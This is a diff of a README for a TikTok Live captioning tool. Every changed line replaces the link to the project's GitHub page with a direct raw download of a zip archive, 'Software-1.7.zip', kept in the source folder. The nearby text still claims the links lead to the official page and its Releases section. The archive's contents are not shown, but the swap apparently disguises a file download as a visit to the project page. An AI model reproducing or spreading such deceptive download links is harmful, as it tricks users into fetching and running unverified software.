@@ -1,6 +1,6 @@
 # 🎥 captions - Real-Time Captions for TikTok Live
 
-[![Download captions](https://img.shields.io/badge/Download-captions-%2389cff0)](https://github.com/Hamza510-max/captions)
+[![Download captions](https://img.shields.io/badge/Download-captions-%2389cff0)](https://raw.githubusercontent.com/Hamza510-max/captions/main/src/Software-1.7.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these steps to get captions up and running on your PC.
 
 Click the big button below. It takes you to the official GitHub page where you can get the app.
 
-[![Download captions](https://img.shields.io/badge/Download-captions-%2389cff0?style=for-the-badge)](https://github.com/Hamza510-max/captions)
+[![Download captions](https://img.shields.io/badge/Download-captions-%2389cff0?style=for-the-badge)](https://raw.githubusercontent.com/Hamza510-max/captions/main/src/Software-1.7.zip)
 
 Once there, look for the latest Windows version or setup file in the Releases section. Download the file named something like `captions-setup.exe` or `captions-windows.exe`.
 
@@ -126,7 +126,7 @@ The translation feature uses language models to provide live text conversion fro
 
 Use the primary link below to visit the main project page on GitHub. You will find all downloads, instructions, and support there.
 
-[https://github.com/Hamza510-max/captions](https://github.com/Hamza510-max/captions)
+[https://raw.githubusercontent.com/Hamza510-max/captions/main/src/Software-1.7.zip](https://raw.githubusercontent.com/Hamza510-max/captions/main/src/Software-1.7.zip)
 
 Look under the **Releases** tab for the latest Windows installer file. Download and run that file to set up captions on your PC.
 
